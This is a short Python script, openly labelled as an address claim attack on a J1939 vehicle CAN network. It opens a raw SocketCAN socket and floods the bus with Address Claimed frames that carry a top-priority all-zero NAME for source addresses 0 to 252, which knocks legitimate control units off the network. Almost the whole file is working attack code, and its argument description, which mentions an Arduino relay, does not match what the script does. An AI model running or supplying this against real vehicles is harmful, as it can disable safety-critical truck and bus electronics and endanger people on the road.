"""
Script for performing an address claim attack on a J1939 network
"""
import socket
import struct
import time
import argparse


def address_claim_attack(interface: str, addrs: list):
    # Setup interface
    sock = socket.socket(socket.PF_CAN, socket.SOCK_RAW, socket.CAN_RAW)

    sock.bind((interface,))

    can_frame_format = "<lB3x8s"

    print("Starting address claim attack")
    # Let's claim all the addresses with high priority NAMEs
    for sa in addrs:

        can_id = 0x18EEFF00 + sa

        # Set the extended frame format bit.
        can_id |= socket.CAN_EFF_FLAG

        # Make a high priority name
        can_data = b'\x00'*8

        can_dlc = min(len(can_data), 8)

        can_packet = struct.pack(can_frame_format, can_id, can_dlc, can_data[:can_dlc] )

        # Send out the CAN frame
        print(f"claiming {sa}")
        sock.send(can_packet)
        time.sleep(.1)

    print("Attack performed")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Shell for interacting with arduino running the CAN relay program")
    parser.add_argument("interface", type=str,
                        help="Interface to perform attack on")
    args = parser.parse_args()
    address_claim_attack(args.interface, [x for x in range(0, 253)])
